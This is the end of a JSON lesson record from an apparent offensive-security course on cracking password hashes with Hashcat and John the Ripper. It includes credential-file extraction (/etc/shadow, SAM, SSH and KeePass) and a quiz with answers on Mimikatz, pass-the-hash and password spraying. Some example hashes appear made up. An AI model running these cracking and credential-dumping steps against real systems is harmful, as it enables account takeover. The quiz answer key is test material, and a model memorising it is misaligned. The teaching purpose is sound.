        "text": "## Understanding Password Hashing\n\n**Hash**: One-way cryptographic function that converts plaintext password to fixed-length string.\n\n**Key properties**:\n- **One-way**: Can't reverse (impossible to go from hash → password mathematically)\n- **Deterministic**: Same input always produces same output (\"password\" always = same hash)\n- **Avalanche effect**: Tiny change in input = completely different output (\"password\" vs \"passwora\" = totally different hashes)\n- **Fixed length**: \"a\" and \"a million character string\" produce same-length hashes\n\n**Example - Same Password, Different Hash Types**:\n```\nPassword:   \"password123\"\nMD5:        482c811da5d5b4bc6d497ffa98491e38\nSHA-1:      cbfdac6008f9cab4083784cbd1874f76618d2a97\nSHA-256:    ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f\nNTLM:       7b1d0f6f2a1c5e84db8f8e7f2b5a1d3c\nbcrypt:     $2b$12$vZQ5xHPdFc.LwuKoOJ8RyeD8g7f4Kp4E2R6fV2X8Y1Z3K4L5M6N7O\n```\n\n**Salt**: Random data added to password before hashing (defeats rainbow tables)\n\n```\nUnsalted:\npassword123 → hash(\"password123\") → 482c811da5d5b4bc6d497ffa98491e38\n\nSalted:\npassword123 + salt(\"a8f3j2k9\") → hash(\"password123a8f3j2k9\") → completely different hash\n```\n\n**Why salting matters**: \n- Prevents rainbow table attacks (precomputed hash tables)\n- Each user has different hash even with same password\n- Attacker must crack each hash individually\n\n**Hash Storage Examples**:\n\n```bash\n# Linux /etc/shadow (SHA-512 with salt)\nroot:$6$rounds=5000$saltsaltsal$hash_goes_here:18000:0:99999:7:::\n\n# Windows NTLM (unsalted - vulnerable!)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n\n# Modern web app (bcrypt with salt)\nuser@example.com:$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZHzHl5.jG\n```\n\n## Common Hash Types and Identification\n\n### Hash Type Identification Table\n\n| Hash Type | Length | Format | Example | Common Usage |\n|-----------|---------|---------|---------|-------------|\n| **MD5** | 32 hex | No prefix | `5f4dcc3b5aa765d61d8327deb882cf99` | Old systems, file checksums |\n| **SHA-1** | 40 hex | No prefix | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` | Legacy systems, Git commits |\n| **SHA-256** | 64 hex | No prefix | `5e884898da28047151d0e56f8dc6292773603d0d...` | Modern systems, blockchain |\n| **SHA-512** | 128 hex | No prefix | `b109f3bbbc244eb82441917ed06d618b9008dd09...` | Linux passwords (/etc/shadow) |\n| **NTLM** | 32 hex | No prefix | `8846f7eaee8fb117ad06bdd830b7586c` | Windows passwords (no salt!) |\n| **NetNTLMv2** | Variable | username::domain:challenge:response:response | Complex format | Windows network auth |\n| **bcrypt** | 60 char | `$2a$`, `$2b$`, `$2y$` | `$2y$10$N9qo8uLOickgx2ZMRZoMyeIjZAg...` | Modern web apps, Rails, Django |\n| **scrypt** | Variable | `$scrypt$` | `$scrypt$ln=16,r=8,p=1$salt$hash` | Cryptocurrency wallets |\n| **Argon2** | Variable | `$argon2` | `$argon2id$v=19$m=65536,t=2,p=1$salt$hash` | Modern apps (PHP 7.2+) |\n\n### Identifying Hash Types\n\n**Method 1: Manual Identification (by length)**\n\n```bash\n# Count characters\necho -n \"8846f7eaee8fb117ad06bdd830b7586c\" | wc -c\n# Output: 32 → Could be MD5 or NTLM\n\necho -n \"5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\" | wc -c\n# Output: 40 → SHA-1\n```\n\n**Method 2: hash-identifier Tool**\n\n```bash\n# Interactive mode\nhash-identifier\n\n# Paste hash when prompted:\n# HASH: 5f4dcc3b5aa765d61d8327deb882cf99\n#\n# Possible Hashs:\n# [+] MD5\n# [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))\n```\n\n**Method 3: hashid Tool (Better)**\n\n```bash\n# Install\npip install hashid\n\n# Identify hash\nhashid '5f4dcc3b5aa765d61d8327deb882cf99'\n# Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'\n# [+] MD5 \n# [+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))\n\n# With Hashcat mode numbers\nhashid -m '5f4dcc3b5aa765d61d8327deb882cf99'\n# [+] MD5 [Hashcat Mode: 0]\n```\n\n**Method 4: Hashcat Example Hashes**\n\n```bash\n# Search Hashcat's example hashes\nhashcat --example-hashes | grep -i ntlm\n# Shows example NTLM hashes and mode number\n\nhashcat --example-hashes | grep -A 2 -B 2 \"MODE: 1000\"\n# Shows examples for mode 1000 (NTLM)\n```\n\n## Hashcat - GPU Password Cracker\n\n### Why Hashcat?\n\n**GPU vs CPU Cracking Speed** (NVIDIA RTX 4090):\n\n```\nHash Type    CPU (i9-13900K)    GPU (RTX 4090)    Speedup\n------------------------------------------------------------\nMD5          500 MH/s           200 GH/s          400x faster\nNTLM         300 MH/s           240 GH/s          800x faster\nSHA-256      50 MH/s            4 GH/s            80x faster\nbcrypt       5 KH/s             100 KH/s          20x faster\n\nMH/s = Million hashes per second\nGH/s = Billion hashes per second  \nKH/s = Thousand hashes per second\n```\n\n**Hashcat Advantages**:\n- ✅ GPU acceleration (1000x faster than CPU for fast hashes)\n- ✅ Supports 300+ hash types\n- ✅ Multiple attack modes (wordlist, rules, masks, hybrid)\n- ✅ Session management (pause/resume)\n- ✅ Distributed cracking (multiple GPUs/systems)\n- ✅ Optimized kernels for various GPU architectures\n- ✅ Active development and updates\n\n### Hashcat Installation\n\n```bash\n# Kali Linux (pre-installed)\nhashcat --version\n\n# Ubuntu/Debian\nsudo apt install hashcat\n\n# From source (latest version)\nwget https://hashcat.net/files/hashcat-6.2.6.7z\n7z x hashcat-6.2.6.7z\ncd hashcat-6.2.6\n./hashcat --version\n\n# Install NVIDIA drivers (for GPU)\nsudo apt install nvidia-driver-535\nsudo reboot\n\n# Verify GPU detected\nhashcat -I\n# Should show your GPU(s)\n```\n\n### Basic Hashcat Syntax\n\n```bash\nhashcat -m <hash_type> -a <attack_mode> <hash_file> <wordlist/mask> [options]\n```\n\n**Required Parameters**:\n- `-m <mode>` : Hash type mode (0=MD5, 1000=NTLM, 1800=sha512crypt, etc.)\n- `-a <attack>` : Attack mode (0=straight, 1=combination, 3=brute-force, etc.)\n- `<hash_file>` : File containing hashes to crack\n- `<wordlist>` : Wordlist file (for attack mode 0)\n\n**Common Hash Type Modes** (full list: `hashcat --help`):\n\n```\nMode    Hash Type               Speed (RTX 4090)\n-----------------------------------------------\n0       MD5                     200 GH/s\n100     SHA-1                   70 GH/s\n1000    NTLM                    240 GH/s\n1400    SHA-256                 4 GH/s\n1700    SHA-512                 1.5 GH/s\n1800    sha512crypt (Linux)     100 KH/s\n3200    bcrypt                  100 KH/s\n5600    NetNTLMv2               2 GH/s\n13100   Kerberos 5 TGS-REP      500 MH/s\n22000   WPA-PBKDF2-PMKID+EAPOL  500 KH/s\n```\n\n**Attack Modes**:\n\n```\n0   Straight (wordlist attack)\n1   Combination (combine two wordlists)\n3   Brute-force/Mask attack\n6   Hybrid wordlist + mask\n7   Hybrid mask + wordlist\n9   Association\n```\n\n### Wordlist Attack (Mode 0) - Most Common\n\n```bash\n# Basic MD5 crack\nhashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# NTLM crack (Windows passwords)\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# SHA-256 crack\nhashcat -m 1400 -a 0 sha256.txt /usr/share/wordlists/rockyou.txt\n\n# bcrypt crack (slow!)\nhashcat -m 3200 -a 0 bcrypt.txt /usr/share/wordlists/rockyou.txt\n\n# Linux SHA-512 crypt\nhashcat -m 1800 -a 0 shadow.txt /usr/share/wordlists/rockyou.txt\n```\n\n**Hash File Format** (hashes.txt):\n\n```\n# One hash per line (plain)\n5f4dcc3b5aa765d61d8327deb882cf99\n482c811da5d5b4bc6d497ffa98491e38\n8846f7eaee8fb117ad06bdd830b7586c\n\n# OR with username (format: hash:username)\n5f4dcc3b5aa765d61d8327deb882cf99:admin\n482c811da5d5b4bc6d497ffa98491e38:root\n8846f7eaee8fb117ad06bdd830b7586c:user1\n```\n\n**Show Cracked Passwords**:\n\n```bash\n# Display all cracked hashes\nhashcat -m 1000 --show ntlm.txt\n\n# Output format:\n8846f7eaee8fb117ad06bdd830b7586c:password123\n7b1d0f6f2a1c5e84db8f8e7f2b5a1d3c:Welcome2024\n```\n\n**Output to File**:\n\n```bash\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -o cracked.txt\n\n# cracked.txt will contain:\n# hash:password\n```\n\n### Rule-Based Attack - Password Mutations\n\nRules mutate wordlist entries to try variations (capitalization, numbers, leetspeak).\n\n**Common Mutations**:\n```\nBase word: \"password\"\n\nRules produce:\nPassword    (capitalize first)\nPASSWORD    (uppercase all)\npassword1   (append digit)\npassword123 (append multiple digits)\np@ssword    (leetspeak)\nPassword!   (append special char)\nPassword123! (combination)\n1password   (prepend digit)\n```\n\n**Using Built-in Rules**:\n\n```bash\n# best64.rule (64 most effective rules)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# OneRuleToRuleThemAll (comprehensive, 52,000 rules!)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule\n\n# d3ad0ne.rule (49,000 rules)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule\n\n# dive.rule (good for corporate passwords)\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule\n```\n\n**Combine Multiple Rules**:\n\n```bash\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt \\\n-r /usr/share/hashcat/rules/best64.rule \\\n-r /usr/share/hashcat/rules/toggles1.rule\n```\n\n**Custom Rule Syntax**:\n\n```bash\n# Create custom rule file (myrules.rule)\ncat << 'EOF' > myrules.rule\n# Append 1\n$1\n# Append 123\n$1$2$3\n# Capitalize first letter\nc\n# Uppercase all\nu\n# Lowercase all\nl\n# Append !\n$!\n# Prepend digit\n^1\n# Replace 'a' with '@'\nsa@\n# Replace 'o' with '0'\nso0\n# Capitalize + append year\nc $2$0$2$4\nEOF\n\n# Use custom rules\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r myrules.rule\n```\n\n**Rule Syntax Reference**:\n\n```\n:    Do nothing (passthrough)\nl    Lowercase all\nu    Uppercase all\nc    Capitalize first, lowercase rest\nC    Lowercase first, uppercase rest\nt    Toggle case of all characters\nTN   Toggle case at position N\n$X   Append character X\n^X   Prepend character X\n[    Delete first character\n]    Delete last character\nDN   Delete character at position N\nsXY  Replace all X with Y\n@X   Purge all instances of X\nz2   Duplicate first two characters\nZ2   Duplicate last two characters\n```\n\n### Mask Attack (Brute Force) - Mode 3\n\nMask attacks try all combinations for a specific pattern.\n\n**Mask Character Sets**:\n\n```\n?l   Lowercase letters (a-z)         [26 characters]\n?u   Uppercase letters (A-Z)         [26 characters]\n?d   Digits (0-9)                    [10 characters]\n?s   Special characters (!@#$%...)   [32 characters]\n?a   All of the above (?l?u?d?s)     [94 characters]\n?b   All 256 byte values (0x00-0xFF)\n\nCustom:\n?1   Custom charset 1 (user-defined)\n?2   Custom charset 2 (user-defined)\n?3   Custom charset 3 (user-defined)\n?4   Custom charset 4 (user-defined)\n```\n\n**Basic Mask Examples**:\n\n```bash\n# 8 lowercase letters\nhashcat -m 1000 -a 3 ntlm.txt ?l?l?l?l?l?l?l?l\n# Tries: aaaaaaaa, aaaaaaab, aaaaaaac... zzzzzzzz\n# Total: 26^8 = 208 billion combinations\n\n# Uppercase + 6 lowercase + 2 digits (Password12)\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?l?d?d\n# Tries: Aaaaaaaa00, Aaaaaaaa01... Zzzzzzzz99\n\n# 4-digit PIN\nhashcat -m 1000 -a 3 ntlm.txt ?d?d?d?d\n# Tries: 0000, 0001, 0002... 9999 (10,000 combinations)\n\n# Known pattern: \"password\" + 2 digits\nhashcat -m 1000 -a 3 ntlm.txt password?d?d\n# Tries: password00, password01... password99\n\n# 6 characters, all possibilities\nhashcat -m 1000 -a 3 ntlm.txt ?a?a?a?a?a?a\n# Tries: all combinations of lowercase, uppercase, digits, special\n# Total: 94^6 = 689 billion combinations\n```\n\n**Incremental Brute Force** (try multiple lengths):\n\n```bash\n# Try lengths 1-8 characters\nhashcat -m 1000 -a 3 ntlm.txt --increment --increment-min=1 --increment-max=8 ?a?a?a?a?a?a?a?a\n\n# Starts with:\n# ?a (1 char)\n# ?a?a (2 chars)\n# ?a?a?a (3 chars)\n# ...\n# ?a?a?a?a?a?a?a?a (8 chars)\n```\n\n**Custom Character Sets**:\n\n```bash\n# Define custom charset (only digits 1-5)\nhashcat -m 1000 -a 3 ntlm.txt -1 12345 ?1?1?1?1\n# Tries: 1111, 1112, 1113... 5555\n\n# Define multiple custom charsets\n# ?1 = vowels, ?2 = consonants\nhashcat -m 1000 -a 3 ntlm.txt -1 aeiou -2 bcdfghjklmnpqrstvwxyz ?2?1?2?1?2?1\n# Tries consonant-vowel-consonant-vowel pattern\n\n# Hex characters only\nhashcat -m 1000 -a 3 ntlm.txt -1 0123456789abcdef ?1?1?1?1?1?1?1?1\n# Useful for API keys, tokens\n```\n\n**Real-World Mask Examples**:\n\n```bash\n# Corporate password pattern: Capital + word + year\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?d?d?d?d\n# Example: Password2024, Company2023\n\n# Common pattern: word + ! or @\nhashcat -m 1000 -a 3 ntlm.txt password?s\nhashcat -m 1000 -a 3 ntlm.txt welcome?s\n\n# Phone number pattern: (123) 456-7890\nhashcat -m 1000 -a 3 ntlm.txt \\(?d?d?d\\)\\ ?d?d?d-?d?d?d?d\n```\n\n### Combination Attack (Mode 1)\n\nCombines words from two wordlists (word1 + word2).\n\n```bash\n# Combine two wordlists\nhashcat -m 1000 -a 1 ntlm.txt wordlist1.txt wordlist2.txt\n\n# Example:\n# wordlist1.txt: john, mary, bob\n# wordlist2.txt: smith, jones, brown\n# Creates: johnsmith, johnjones, johnbrown, marysmith, maryjones...\n\n# Combine first names + last names\nhashcat -m 1000 -a 1 ntlm.txt first_names.txt last_names.txt\n\n# Combine words + years\nseq 1990 2024 > years.txt\nhashcat -m 1000 -a 1 ntlm.txt common_words.txt years.txt\n# Creates: password1990, password1991... welcome2024\n```\n\n### Hybrid Attacks (Mode 6 and 7)\n\n**Hybrid Wordlist + Mask** (Mode 6):\n\n```bash\n# Wordlist + 3 digits\nhashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d?d\n# Tries: password000, password001... password999\n# For each word in rockyou.txt\n\n# Wordlist + year\nhashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d?d?d\n# Tries: password2024, welcome2024, etc.\n\n# Wordlist + special char\nhashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?s\n# Tries: password!, password@, password#, etc.\n```\n\n**Hybrid Mask + Wordlist** (Mode 7):\n\n```bash\n# 3 digits + wordlist\nhashcat -m 1000 -a 7 ntlm.txt ?d?d?d rockyou.txt\n# Tries: 123password, 456welcome, etc.\n\n# Special char + wordlist\nhashcat -m 1000 -a 7 ntlm.txt ?s rockyou.txt\n# Tries: !password, @welcome, etc.\n```\n\n### Performance Optimization\n\n**Check Available Devices**:\n\n```bash\n# List OpenCL devices (GPUs)\nhashcat -I\n\n# Example output:\n# Backend Device ID #1\n#  Type...........: GPU\n#  Vendor.ID......: 2 (NVIDIA)\n#  Name...........: NVIDIA GeForce RTX 4090\n#  Processor(s)...: 128\n#  Clock..........: 2520 MHz\n#  Memory.Total...: 24564 MB\n```\n\n**Device Selection**:\n\n```bash\n# Use specific GPU\nhashcat -m 1000 -a 0 -d 1 ntlm.txt rockyou.txt\n\n# Use multiple GPUs\nhashcat -m 1000 -a 0 -d 1,2,3 ntlm.txt rockyou.txt\n\n# Use CPU only (slow!)\nhashcat -m 1000 -a 0 -D 1 ntlm.txt rockyou.txt\n```\n\n**Workload Tuning**:\n\n```bash\n# -w N: Workload profile (1=low, 2=default, 3=high, 4=insane)\n\n# Low (desktop usable)\nhashcat -m 1000 -a 0 -w 1 ntlm.txt rockyou.txt\n\n# Default (balanced)\nhashcat -m 1000 -a 0 -w 2 ntlm.txt rockyou.txt\n\n# High (GPU dedicated)\nhashcat -m 1000 -a 0 -w 3 ntlm.txt rockyou.txt\n\n# Insane (system may be unresponsive)\nhashcat -m 1000 -a 0 -w 4 ntlm.txt rockyou.txt\n```\n\n**Session Management**:\n\n```bash\n# Start session with name\nhashcat -m 1000 -a 0 --session=mysession ntlm.txt rockyou.txt\n\n# Pause session (Ctrl+C or 'p' key)\n# Session saved automatically\n\n# Resume session\nhashcat --session=mysession --restore\n\n# Check session progress\nhashcat --session=mysession --restore-file-path\n\n# Remove session\nhashcat --session=mysession --remove\n```\n\n**Status During Cracking**:\n\n```bash\n# While cracking is running:\n# Press 's' - Show status\n# Press 'p' - Pause\n# Press 'r' - Resume\n# Press 'c' - Bypass current word\n# Press 'q' - Quit (saves session)\n```\n\n## John the Ripper - CPU Password Cracker\n\n### When to Use John vs Hashcat\n\n**Use John when**:\n- No GPU available\n- Hash type auto-detection needed\n- Cracking archive files (ZIP, RAR, etc.)\n- Using CPU-optimized attacks\n- Need compatibility (works everywhere)\n\n**Use Hashcat when**:\n- Have GPU available\n- Know exact hash type\n- Need maximum speed\n- Attacking common hash types (MD5, NTLM, SHA-1)\n\n### Basic John Usage\n\n```bash\n# Auto-detect and crack\njohn hashes.txt\n\n# With wordlist\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Show cracked passwords\njohn --show hashes.txt\n\n# Crack with rules\njohn --wordlist=rockyou.txt --rules hashes.txt\n\n# Incremental mode (brute force)\njohn --incremental hashes.txt\n\n# Specific format\njohn --format=NT hashes.txt  # NTLM\njohn --format=raw-md5 hashes.txt  # MD5\njohn --format=bcrypt hashes.txt  # bcrypt\n\n# List supported formats\njohn --list=formats\n\n# Status check\njohn --status\n```\n\n### John Hash Format Conversion\n\nJohn includes tools to extract hashes from various sources:\n\n```bash\n# Convert Windows SAM\npwdump machine_name > hashes.txt\njohn hashes.txt\n\n# Convert Linux shadow\nunshadow /etc/passwd /etc/shadow > linux_hashes.txt\njohn linux_hashes.txt\n\n# Extract from ZIP file\nzip2john encrypted.zip > zip_hash.txt\njohn zip_hash.txt\n\n# Extract from RAR file\nrar2john encrypted.rar > rar_hash.txt\njohn rar_hash.txt\n\n# Extract from PDF\npdf2john encrypted.pdf > pdf_hash.txt\njohn pdf_hash.txt\n\n# Extract from SSH key\nssh2john id_rsa > ssh_hash.txt\njohn ssh_hash.txt\n\n# Extract from KeePass database\nkeepass2john database.kdbx > keepass_hash.txt\njohn keepass_hash.txt\n```\n\n## Real-World Cracking Strategy\n\nFollow this workflow for efficient hash cracking:\n\n### Stage 1: Quick Wins (5 minutes)\n\n```bash\n# Try top 10,000 most common passwords\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/seclists/Passwords/darkweb2017-top10000.txt\n\n# Expected: Crack 20-40% of hashes with weak passwords\n```\n\n### Stage 2: Full Wordlist (30 minutes)\n\n```bash\n# RockYou wordlist (14 million passwords)\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# Expected: Crack another 10-20% of hashes\n```\n\n### Stage 3: Wordlist + Rules (2 hours)\n\n```bash\n# Apply password mutations with best64 rules\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Expected: Crack another 10-15% of hashes\n# Catches passwords like: Password123, Welcome2024, Admin!\n```\n\n### Stage 4: Targeted Masks (6 hours)\n\n```bash\n# Common corporate password patterns\n\n# Pattern 1: Capital + 7 lowercase + 2 digits\nhashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?l?d?d\n\n# Pattern 2: Word + year\nhashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d?d?d\n\n# Pattern 3: Word + special char\nhashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?s\n\n# Expected: Crack another 5-10% of hashes\n```\n\n### Stage 5: Extended Attacks (days/weeks)\n\n```bash\n# Larger wordlists\nhashcat -m 1000 -a 0 ntlm.txt /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt\n\n# More complex rules\nhashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule\n\n# Brute force up to 8 characters\nhashcat -m 1000 -a 3 ntlm.txt --increment --increment-min=1 --increment-max=8 ?a?a?a?a?a?a?a?a\n```\n\n### Stage 6: When to Give Up\n\nFor slow hashes (bcrypt, scrypt, Argon2), consider:\n\n```bash\n# Calculate time estimate\n# bcrypt with RTX 4090: ~100,000 H/s\n# 8-character random password: 94^8 = 6.1 quadrillion combinations\n# Time: 6.1e15 / 100000 / 60 / 60 / 24 / 365 = 1,934 years\n\n# Options:\n# 1. Rent cloud GPU (AWS p4d.24xlarge: 8x A100 GPUs)\n# 2. Distributed cracking (multiple machines)\n# 3. Give up and move to other hashes\n# 4. Social engineering to get plaintext password\n```\n\n**Cost Analysis Example**:\n\n```\nAWS p4d.24xlarge (8x A100 GPUs):\n- Speed: ~800,000 bcrypt H/s (8x faster)\n- Cost: $32.77/hour\n- Time to crack 8-char bcrypt: Still ~242 years\n- Cost to crack: $32.77 * 24 * 365 * 242 = $69.7 million\n\nConclusion: bcrypt/scrypt/Argon2 are designed to resist cracking!\n```\n\n## Common Pitfalls and Solutions\n\n**Problem: \"No hashes loaded\"**\n```bash\n# Issue: Wrong hash format or corrupted file\n# Solution: Verify hash format\ncat hashes.txt\nhashid hashes.txt\n\n# Ensure one hash per line, no extra spaces\n```\n\n**Problem: \"Approaching final keyspace - workload adjusted\"**\n```bash\n# Issue: Wordlist exhausted, attack finishing\n# Solution: This is normal, let it complete\n# Then try different attack (rules, masks)\n```\n\n**Problem: \"Out of memory\"**\n```bash\n# Issue: GPU RAM exceeded (large wordlist + rules)\n# Solution: Reduce workload\nhashcat -m 1000 -a 0 -w 2 ntlm.txt rockyou.txt  # Lower workload\n\n# Or split wordlist\nsplit -l 1000000 rockyou.txt rockyou_part_\nhashcat -m 1000 -a 0 ntlm.txt rockyou_part_aa\nhashcat -m 1000 -a 0 ntlm.txt rockyou_part_ab\n```\n\n**Problem: Slow cracking speed**\n```bash\n# Check GPU utilization\nnvidia-smi\n\n# Ensure GPU drivers installed\nnvidia-smi --query-gpu=driver_version --format=csv\n\n# Increase workload\nhashcat -m 1000 -a 0 -w 4 ntlm.txt rockyou.txt\n\n# Use faster hash mode (if applicable)\n# Example: NTLM (mode 1000) is faster than NetNTLMv2 (mode 5600)\n```\n\nPassword cracking is both an art and a science. Understanding hash types, attack modes, and performance optimization will make you a formidable red teamer and a better defender."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "q1",
      "type": "multiple_choice",
      "question": "What is the main advantage of offline password attacks (hash cracking) over online password attacks?",
      "options": [
        "They work without obtaining password hashes first",
        "They are much faster and don't trigger account lockouts or detection systems",
        "They always succeed within minutes",
        "They work against any authentication system"
      ],
      "correct_answer": 1,
      "explanation": "Offline attacks are much faster (millions of attempts per second with GPU) and don't risk detection or account lockout since you're cracking hashes locally. However, you must first obtain the password hashes through dumping SAM, NTDS.dit, or memory.",
      "difficulty": 2
    },
    {
      "question_id": "q2",
      "type": "multiple_choice",
      "question": "In Hashcat, what does the mask '?u?l?l?l?l?l?d?d' represent?",
      "options": [
        "8 random characters",
        "Uppercase letter + 5 lowercase letters + 2 digits (e.g., Password12)",
        "User input placeholder",
        "Unicode characters"
      ],
      "correct_answer": 1,
      "explanation": "Hashcat mask syntax: ?u=uppercase, ?l=lowercase, ?d=digit. The mask ?u?l?l?l?l?l?d?d matches patterns like Password12, Summer24, Winter99, etc. This is useful for cracking corporate passwords that follow Uppercase+word+digits patterns.",
      "difficulty": 2
    },
    {
      "question_id": "q3",
      "type": "multiple_choice",
      "question": "Why does Pass-the-Hash work on Windows systems?",
      "options": [
        "NTLM authentication only requires the password hash, not the plaintext password",
        "Windows stores passwords in plaintext",
        "It exploits a Windows vulnerability",
        "It only works on outdated Windows versions"
      ],
      "correct_answer": 0,
      "explanation": "Pass-the-Hash works because NTLM authentication protocol authenticates users with their password hash directly. You don't need to crack the password - just provide the hash. This is not a vulnerability but a design characteristic of NTLM. Mitigation includes disabling NTLM, using Kerberos, and implementing Credential Guard.",
      "difficulty": 2
    },
    {
      "question_id": "q4",
      "type": "multiple_choice",
      "question": "What is the recommended strategy for password spraying to avoid account lockouts?",
      "options": [
        "Try 100 passwords against one user",
        "Try one common password against many users",
        "Use slow timing between attempts",
        "Only attack at night"
      ],
      "correct_answer": 1,
      "explanation": "Password spraying tries ONE password against MANY users, rather than many passwords against one user. This avoids triggering account lockout policies (typically 3-5 failed attempts). Example: Try 'Password123!' against all 100 users, then 'Welcome2024!' against all users, etc.",
      "difficulty": 2
    },
    {
      "question_id": "q5",
      "type": "multiple_choice",
      "question": "Which Mimikatz command dumps plaintext passwords and NTLM hashes from memory?",
      "options": [
        "mimikatz::passwords",
        "sekurlsa::logonpasswords",
        "lsadump::sam",
        "token::elevate"
      ],
      "correct_answer": 1,
      "explanation": "sekurlsa::logonpasswords extracts credentials from LSASS (Local Security Authority Subsystem Service) memory, including plaintext passwords (if WDigest enabled), NTLM hashes, and Kerberos tickets. This requires SeDebugPrivilege (enabled with privilege::debug) and local admin or SYSTEM rights.",
      "difficulty": 1
    }
  ],
  "mastery_threshold": 80,
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "gamify_it",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "base_xp_reward": 250,
  "is_core_concept": true,
  "author": "CyberLearn Curriculum Team",
  "version": "2.0"
}
